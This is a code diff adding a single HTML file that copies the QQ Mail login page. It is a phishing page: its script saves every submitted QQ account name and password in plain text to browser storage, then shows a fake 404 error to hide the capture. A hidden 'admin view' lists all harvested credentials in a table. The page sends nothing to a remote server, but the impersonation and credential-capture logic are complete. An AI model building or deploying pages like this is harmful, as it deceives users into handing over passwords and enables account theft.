@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QQ邮箱</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23f5f5f5"/><path d="M0 0L100 100M100 0L0 100" stroke="%23e0e0e0" stroke-width="1"/></svg>');
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .header {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .logo {
+            font-size: 36px;
+            color: #12b7f5;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .slogan {
+            font-size: 18px;
+            color: #666;
+        }
+        
+        .login-container {
+            width: 380px;
+            background-color: white;
+            border-radius: 4px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+        }
+        
+        .login-title {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            height: 40px;
+            border: 1px solid #ddd;
+            border-radius: 2px;
+            padding: 0 12px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        
+        .input-group input:focus {
+            border-color: #12b7f5;
+            outline: none;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .remember-me input {
+            margin-right: 8px;
+        }
+        
+        .login-btn {
+            width: 100%;
+            height: 40px;
+            background-color: #12b7f5;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .login-btn:hover {
+            background-color: #0fa1db;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #12b7f5;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .error-message {
+            color: #ff4d4f;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        /* 404页面样式 */
+        .error-page {
+            display: none;
+            text-align: center;
+            padding: 50px 20px;
+        }
+        
+        .error-code {
+            font-size: 120px;
+            color: #12b7f5;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        
+        .error-message-404 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .error-description {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .back-btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #12b7f5;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+        
+        .back-btn:hover {
+            background-color: #0fa1db;
+        }
+        
+        /* 管理员查看页面样式 */
+        .admin-container {
+            width: 90%;
+            max-width: 900px;
+            background-color: white;
+            border-radius: 4px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            display: none;
+        }
+        
+        .admin-title {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .admin-description {
+            color: #666;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .login-records {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        
+        .login-records th {
+            background-color: #f5f5f5;
+            padding: 12px 15px;
+            text-align: left;
+            font-weight: 600;
+            color: #333;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .login-records td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .login-records tr:hover {
+            background-color: #f9f9f9;
+        }
+        
+        .no-records {
+            text-align: center;
+            color: #999;
+            padding: 20px;
+        }
+        
+        .admin-actions {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .action-btn {
+            padding: 8px 16px;
+            background-color: #12b7f5;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .action-btn:hover {
+            background-color: #0fa1db;
+        }
+        
+        .action-btn.delete {
+            background-color: #ff4d4f;
+        }
+        
+        .action-btn.delete:hover {
+            background-color: #e04345;
+        }
+        
+        .admin-link {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: #12b7f5;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .admin-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <a href="#" class="admin-link" id="adminLink">管理员查看</a>
+    
+    <div class="container">
+        <div class="header">
+            <div class="logo">QQ邮箱</div>
+            <div class="slogan">常联系，勤沟通</div>
+        </div>
+        
+        <div class="login-container" id="loginForm">
+            <h2 class="login-title">登录QQ邮箱</h2>
+            <form id="login-form">
+                <div class="input-group">
+                    <label for="username">QQ账号</label>
+                    <input type="text" id="username" name="username" placeholder="QQ号/邮箱/手机号" required>
+                    <div class="error-message" id="username-error">请输入正确的QQ账号</div>
+                </div>
+                
+                <div class="input-group">
+                    <label for="password">密码</label>
+                    <input type="password" id="password" name="password" placeholder="QQ密码" required>
+                    <div class="error-message" id="password-error">请输入密码</div>
+                </div>
+                
+                <div class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">记住密码</label>
+                </div>
+                
+                <button type="submit" class="login-btn">登录</button>
+            </form>
+            
+            <div class="footer">
+                <a href="#">忘记密码？</a> | 
+                <a href="#">注册新账号</a> | 
+                <a href="#">意见反馈</a>
+            </div>
+        </div>
+        
+        <div class="error-page" id="errorPage">
+            <div class="error-code">404</div>
+            <div class="error-message-404">抱歉，您访问的页面不存在</div>
+            <div class="error-description">
+                可能的原因：<br>
+                1. 您输入的网址不正确<br>
+                2. 页面可能已被删除或移动<br>
+                3. 服务器暂时无法响应您的请求
+            </div>
+            <a href="#" class="back-btn" id="backBtn">返回登录页面</a>
+        </div>
+        
+        <div class="admin-container" id="adminContainer">
+            <h2 class="admin-title">登录记录查看</h2>
+            <p class="admin-description">以下是用户尝试登录的记录信息</p>
+            
+            <table class="login-records" id="loginRecords">
+                <thead>
+                    <tr>
+                        <th>时间</th>
+                        <th>用户名</th>
+                        <th>密码</th>
+                        <th>记住密码</th>
+                    </tr>
+                </thead>
+                <tbody id="recordsBody">
+                    <!-- 记录将在这里动态添加 -->
+                </tbody>
+            </table>
+            
+            <div class="no-records" id="noRecords">暂无登录记录</div>
+            
+            <div class="admin-actions">
+                <button class="action-btn" id="refreshBtn">刷新记录</button>
+                <button class="action-btn delete" id="clearBtn">清除所有记录</button>
+                <button class="action-btn" id="backToLoginBtn">返回登录页面</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('login-form');
+            const loginContainer = document.getElementById('loginForm');
+            const errorPage = document.getElementById('errorPage');
+            const backBtn = document.getElementById('backBtn');
+            const adminLink = document.getElementById('adminLink');
+            const adminContainer = document.getElementById('adminContainer');
+            const recordsBody = document.getElementById('recordsBody');
+            const noRecords = document.getElementById('noRecords');
+            const refreshBtn = document.getElementById('refreshBtn');
+            const clearBtn = document.getElementById('clearBtn');
+            const backToLoginBtn = document.getElementById('backToLoginBtn');
+            
+            // 初始化记录存储
+            if (!localStorage.getItem('loginRecords')) {
+                localStorage.setItem('loginRecords', JSON.stringify([]));
+            }
+            
+            // 登录表单提交
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                const remember = document.getElementById('remember').checked;
+                
+                // 简单验证
+                if (!username) {
+                    document.getElementById('username-error').style.display = 'block';
+                    return;
+                } else {
+                    document.getElementById('username-error').style.display = 'none';
+                }
+                
+                if (!password) {
+                    document.getElementById('password-error').style.display = 'block';
+                    return;
+                } else {
+                    document.getElementById('password-error').style.display = 'none';
+                }
+                
+                // 记录登录信息
+                const loginRecord = {
+                    timestamp: new Date().toLocaleString(),
+                    username: username,
+                    password: password,
+                    remember: remember
+                };
+                
+                // 保存到localStorage
+                const records = JSON.parse(localStorage.getItem('loginRecords'));
+                records.push(loginRecord);
+                localStorage.setItem('loginRecords', JSON.stringify(records));
+                
+                // 显示加载效果
+                const loginBtn = document.querySelector('.login-btn');
+                loginBtn.textContent = '登录中...';
+                loginBtn.disabled = true;
+                
+                // 模拟网络请求延迟
+                setTimeout(function() {
+                    // 隐藏登录表单，显示404页面
+                    loginContainer.style.display = 'none';
+                    errorPage.style.display = 'block';
+                    
+                    // 重置登录按钮
+                    loginBtn.textContent = '登录';
+                    loginBtn.disabled = false;
+                }, 1500);
+            });
+            
+            // 返回登录页面
+            backBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // 返回登录页面
+                errorPage.style.display = 'none';
+                loginContainer.style.display = 'block';
+            });
+            
+            // 显示管理员页面
+            adminLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // 隐藏其他页面，显示管理员页面
+                loginContainer.style.display = 'none';
+                errorPage.style.display = 'none';
+                adminContainer.style.display = 'block';
+                
+                // 刷新记录显示
+                refreshRecords();
+            });
+            
+            // 刷新记录
+            refreshBtn.addEventListener('click', function() {
+                refreshRecords();
+            });
+            
+            // 清除所有记录
+            clearBtn.addEventListener('click', function() {
+                if (confirm('确定要清除所有登录记录吗？')) {
+                    localStorage.setItem('loginRecords', JSON.stringify([]));
+                    refreshRecords();
+                }
+            });
+            
+            // 返回登录页面
+            backToLoginBtn.addEventListener('click', function() {
+                adminContainer.style.display = 'none';
+                loginContainer.style.display = 'block';
+            });
+            
+            // 刷新记录显示
+            function refreshRecords() {
+                const records = JSON.parse(localStorage.getItem('loginRecords'));
+                recordsBody.innerHTML = '';
+                
+                if (records.length === 0) {
+                    noRecords.style.display = 'block';
+                    document.querySelector('.login-records').style.display = 'none';
+                } else {
+                    noRecords.style.display = 'none';
+                    document.querySelector('.login-records').style.display = 'table';
+                    
+                    records.forEach(record => {
+                        const row = document.createElement('tr');
+                        
+                        const timeCell = document.createElement('td');
+                        timeCell.textContent = record.timestamp;
+                        row.appendChild(timeCell);
+                        
+                        const userCell = document.createElement('td');
+                        userCell.textContent = record.username;
+                        row.appendChild(userCell);
+                        
+                        const passCell = document.createElement('td');
+                        passCell.textContent = record.password;
+                        row.appendChild(passCell);
+                        
+                        const rememberCell = document.createElement('td');
+                        rememberCell.textContent = record.remember ? '是' : '否';
+                        row.appendChild(rememberCell);
+                        
+                        recordsBody.appendChild(row);
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
